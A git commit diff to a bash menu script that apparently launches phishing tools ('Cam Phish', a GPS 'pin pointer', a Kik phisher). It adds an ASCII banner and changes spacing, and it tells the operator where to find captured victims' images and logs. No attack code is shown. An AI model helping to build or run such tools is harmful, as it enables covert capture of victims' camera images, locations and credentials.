04106cabdfc65458ac99c6beaf7f4a5d80ab8cba
DemiGodVoid <162964001+DemiGodVoid@users.noreply.github.com>
2024-08-08 22:27:50 -0500

    Update pick.sh

--- tools/phishers/pick.sh
+++ tools/phishers/pick.sh
@@ -8,12 +8,21 @@ NC='\033[0m'  # No color
 clear
 
 # Display menu options
+echo -e "                                                                         ${RED} ________  ___  ___  ___  ________  ___  ___  _______   ________  ________${NC}"      
+echo -e "                                                                         ${RED}|\   __  \|\  \|\  \|\  \|\   ____\|\  \|\  \|\  ___ \ |\   __  \|\   ____\${NC}"     
+echo -e "                                                                         ${RED}\ \  \|\  \ \  \\\  \ \  \ \  \___|\ \  \\\  \ \   __/|\ \  \|\  \ \  \___|_${NC}"    
+echo -e "                                                                         ${RED}\ \   ____\ \   __  \ \  \ \_____  \ \   __  \ \  \_|/_\ \   _  _\ \_____  \${NC}"   
+echo -e "                                                                         ${RED}\ \  \___|\ \  \ \  \ \  \|____|\  \ \  \ \  \ \  \_|\ \ \  \\  \\|____|\  \${NC}"  
+echo -e "                                                                         ${RED}\ \__\    \ \__\ \__\ \__\____\_\  \ \__\ \__\ \_______\ \__\\ _\ ____\_\  \${NC}" 
+echo -e "                                                                         ${RED}\|__|     \|__|\|__|\|__|\_________\|__|\|__|\|_______|\|__|\|__|\_________\${NC}"
+echo -e "                                                                         ${RED}                             \|_________|                            \|_________|${NC}"
+
 echo -e "                                                                                                      ${RED}1. Cam Phish${NC}"
 echo -e "                                                                                                      ${RED}2. gps pin pointer${NC}"
 echo -e "                                                                                                      ${RED}0. Exit${NC}"
 
 # Read user input
-read -p "                                                                                            $(echo -e ${RED}Choose an option: ${NC})" choice
+read -p "$(echo -e ${RED}Choose an option: ${NC})" choice
 
 # Handle user input
 case $choice in
@@ -21,18 +30,18 @@ case $choice in
         # Display a message and wait for user to press Enter
         echo -e "                                                                                              ${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
         echo -e "                                                                                              ${RED}Find the victims imgs in cd tools/phishers/imgs${NC}"
-        read -p "                                                                                              $(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
+        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     2)
         # Display a message and wait for user to press Enter
-        echo -e "                                                                                             ${RED}Start gps pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
-        echo -e "                                                                                             ${RED}Find the victims logs in cd tools/phishers/ and then open logs.txt${NC}"
-        read -p "                                                                                             $(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
+        echo -e "                                                                                              ${RED}Start gps pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
+        echo -e "                                                                                              ${RED}Find the victims logs in cd tools/phishers/ and then open logs.txt${NC}"
+        read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     3)
         # Display a message and wait for user to press Enter
-        echo -e "${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
-        echo -e "${RED}Find the victims logs in cd tools/phishers/ and then open saved.txt${NC}"
+        echo -e "                                                                                              ${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
+        echo -e "                                                                                              ${RED}Find the victims logs in cd tools/phishers/ and then open saved.txt${NC}"
         read -p "$(echo -e ${RED}Press [Enter] to return to the menu or exit...${NC})"
         ;;
     0)
